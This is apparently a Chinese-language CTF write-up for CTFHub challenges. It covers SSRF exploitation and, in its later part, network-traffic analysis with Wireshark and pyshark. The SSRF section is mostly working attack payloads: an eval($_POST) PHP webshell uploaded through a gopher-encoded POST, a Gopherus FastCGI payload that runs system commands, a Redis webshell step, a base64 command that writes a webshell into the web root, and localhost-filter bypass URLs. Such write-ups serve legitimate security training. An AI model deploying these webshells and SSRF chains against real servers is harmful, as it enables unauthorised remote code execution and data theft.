  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>

<p>发送</p>
  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<p>返回</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>得知是要构造一个表单提交。</p>
<ol start="2">
<li>使用http协议，访问flag.php</li>
</ol>
  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>发现并没有提交的button，我们需要自己写一个</p>
  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后bp抓包</p>
  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>330</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryqNWrH2XOYKqFjQzw</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.pphphp&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">æäº¤</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure>

<p>  编码两次结果</p>
  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gohper://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520330%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Macintosh%253B%2520Intel%2520Mac%2520OS%2520X%252010_15_7%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell.pphphp%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527shell%2527%255D%2529%253B%2520%253F%253E%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span><br></pre></td></tr></table></figure>

<p>访问index.php抓包，构造payload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">不知道为啥过不了，和网上流程都一样，不管</span><br><span class="line"></span><br><span class="line">#### fastcgi</span><br><span class="line"></span><br><span class="line">- 这里要用到**gopherus**类进行payload生成</span><br><span class="line"></span><br><span class="line">  ```cmd</span><br><span class="line">  python2 gopherus --exploit fastcgi</span><br><span class="line">  /var/www/html/index.php</span><br><span class="line">  ls</span><br><span class="line">  # 获得</span><br><span class="line">  gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
<p>  然后再进行一次url编码<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>使用bp的repeater发送后获取</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NX-Powered-By: PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">-----Made-by-SpyD3r-----</span><br><span class="line">htm</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后重复上述操作，输入并进行url编码即可获取flag</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">ls /flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>也可以写个一句话木马上去</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> JTNDJTNGcGhwJTIwZXZhbCUyOCUyNF9QT1NUJTVCc2hlbGwlNUQlMjklM0IlM0YlM0UlMDA= | base64 -d &gt; /var/www/html/shel1.php</span><br></pre></td></tr></table></figure></li>
</ul>
<p>其中*&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php<em>可以用</em>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php*代替，就是服务器里面有的php文件即可，pear是自带的。</p>
<p><a target="_blank" rel="noopener" href="https://www.modb.pro/db/163739">原理参考</a></p>
<h4><span id="redis协议">Redis协议</span></h4><ul>
<li><p>通过gopherus一把梭</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis</span><br><span class="line">PHPShell</span><br><span class="line">&lt;?php eval($_POST[shell]);?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>再进行一次url编码即可</p>
</li>
</ul>
<h4><span id="url-bypass">URL Bypass</span></h4><p>这个题的考点与DNS解析有关，像我们平时输入的百度网址<a href="http://www.baidu.com中的www是什么意思？我们简单了解一下域名解析前缀的作用">www.baidu.com中的www是什么意思？我们简单了解一下域名解析前缀的作用</a></p>
<p>www：二级域名解析，以百度为例，就是<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
<p>@ ：主域名解析，即@符号后面直接跟域名，如果前面有东西，会被忽略。</p>
<p>*：是指泛解析，是指除已添加的解析记录以外的所有主机都以此为准，以百度为例，就是 12343.baidu.com。</p>
<ul>
<li><p>这道题直接使用@跳过</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://notfound.ctfhub.com@127.0.0.1:80/flag.php</span><br></pre></td></tr></table></figure></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/120895812">其他方法</a></p>
<h4><span id="数字ip-bypass">数字IP Bypass</span></h4><p><a target="_blank" rel="noopener" href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IP地址转换</a></p>
<ul>
<li><p>方法一：通过IP地址转换，将10进制的数代替127.0.0.1即可，或者16进制前面加个0x</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=2130706433:80/flag.php</span><br><span class="line"></span><br><span class="line">http://challenge-b558d4473913b437.sandbox.ctfhub.com:10800/?url=0x7F000001:80/flag.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二：使用localhost</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=localhost:80/flag.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法三；特殊地址<a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0/</a></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=0/flag.php</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="302跳转">302跳转</span></h4><ul>
<li>常规解法参考上题能做。</li>
<li>使用<a target="_blank" rel="noopener" href="https://www.bejson.com/convert/shorturl/">短地址转换</a> <code>http://127.0.0.1/flag.php</code>即可</li>
</ul>
<h4><span id="dns重绑定-bypass">DNS重绑定 Bypass</span></h4><ul>
<li><p><strong>同源策略</strong>：两个URL使用相同的<font color="red"><em><strong>协议、域名、端口</strong></em> </font>（IE浏览器没有端口）三者相同则称为同源。简单来说同源就是为了使一个域名下的网站只能调用本域名下的资源，防止其它域名的访问造成一些危害。</p>
</li>
<li><p>DNS重绑定：在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。（浏览器同源策略） 这就是DNS Rebinding攻击。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89426041">参考</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">重绑定工具地址</a></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-008000c7973432be.sandbox.ctfhub.com:10800/?url=7f000001.c0a80001.rbndr.us/flag.php</span><br></pre></td></tr></table></figure></li>
</ul>
<h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1><h3><span id="流量分析">流量分析</span></h3><ul>
<li>使用到工具是<strong>WireShark</strong></li>
</ul>
<h4><span id="mysql流量">Mysql流量</span></h4><ul>
<li>直接下载包，然后在filter里面输入mysql，然后看info里面登录成功的那条</li>
<li>使用<strong>follow tcp stream</strong> 然后在<strong>find</strong>里面输入关键字<code>ctf</code>即可。</li>
</ul>
<h4><span id="redis流量">Redis流量</span></h4><ul>
<li><p>使用<strong>follow tcp stream</strong> 然后在<strong>find</strong>里面输入关键字<code>ctf</code>即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Fl4g1</span><br><span class="line">$22</span><br><span class="line">ctfhub&#123;6051d6123de43df</span><br><span class="line">+OK</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$5</span><br><span class="line">flag2</span><br><span class="line">$18</span><br><span class="line">ad7609804925c0121&#125;</span><br></pre></td></tr></table></figure>

<p>拼接出<code>ctfhub&#123;6051d6123de43dfad7609804925c0121&#125;</code></p>
</li>
</ul>
<h4><span id="mongodb">MongoDB</span></h4><ul>
<li>也是直接跟踪流，然后旁边有个选项可以直接选择第几个流，我们直接搜关键词<code>ctfhub&#123;</code>找不到就换下个流，节省很多时间。</li>
</ul>
<h4><span id="icmp-data">ICMP Data</span></h4><ul>
<li><p>方法一：无法跟踪流，用↓逐个观察，发现有个位置每次和上次不一样，拼起来就是flag，每次都有两个包是一样的一个<em>request</em>一个<em>response</em>，因此答案就是<code>ctfhub&#123;c87eb99796406ac0b&#125;</code></p>
</li>
<li><p>方法二：编写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author：valecalida--</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system <span class="keyword">as</span> get_hex</span><br><span class="line"><span class="comment"># 调用tshark时需要将tshark加入环境变量，且脚本需要与流量包在一个路径下</span></span><br><span class="line"> </span><br><span class="line">get_hex(<span class="string">&quot;tshark -r icmp_data.pcap -Y \&quot;icmp &amp;&amp; icmp.type==8\&quot; -T fields -e data &gt; flag.txt&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(line[<span class="number">16</span>:<span class="number">18</span>], <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>使用pyshark，其中<strong>type&#x3D;8即请求，type&#x3D;0即响应</strong>，这里0或者8都可以，因为是重复的。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&quot;icmp_data.pcap&quot;</span>, display_filter=<span class="string">&quot;icmp &amp;&amp; icmp.type==8&quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(cap[i].icmp.data_data)[<span class="number">24</span>:<span class="number">26</span>], <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>注意</strong>：在jupyter里面使用代码会导致报错<code>This event loop is already running</code>。</p>
<p><em>解决方案：</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nest_asyncio</span><br><span class="line">nest_asyncio.apply()</span><br></pre></td></tr></table></figure>

<h4><span id="icmp-length">ICMP Length</span></h4><ul>
<li><p>题目提示，flag暗藏玄只因。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&#x27;icmp_len.pcap&#x27;</span>,display_filter=<span class="string">&#x27;icmp &amp;&amp; icmp.type==8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">18</span>):</span><br><span class="line">    pkt = cap[i]</span><br><span class="line">    flag+=(<span class="built_in">chr</span>(<span class="built_in">int</span>(pkt.icmp.data_len)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="icmp-lengthbin">ICMP LengthBin</span></h4><ul>
<li><p>题目很直接的给了提示，就是二进制与length的关系，使用wireshark打开流量包查看，使用过滤器icmp&amp;&amp; icmp.type&#x3D;&#x3D;8来进行过滤，查看每一条流量的length值，发现都是32或64，直接编写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&#x27;icmp_len_binary.pcap&#x27;</span>, display_filter=<span class="string">&quot;icmp &amp;&amp; icmp.type==8&quot;</span>)</span><br><span class="line">cap.load_packets()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">con1 = <span class="string">&quot;&quot;</span></span><br><span class="line">con2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cap)):</span><br><span class="line">    <span class="keyword">if</span> cap[i].icmp.data_len == <span class="string">&#x27;32&#x27;</span>:</span><br><span class="line">        con1 += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        con2 += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> cap[i].icmp.data_len == <span class="string">&#x27;64&#x27;</span>:</span><br><span class="line">        con1 += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        con2 += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(con1, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(con2, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li>
</ul>
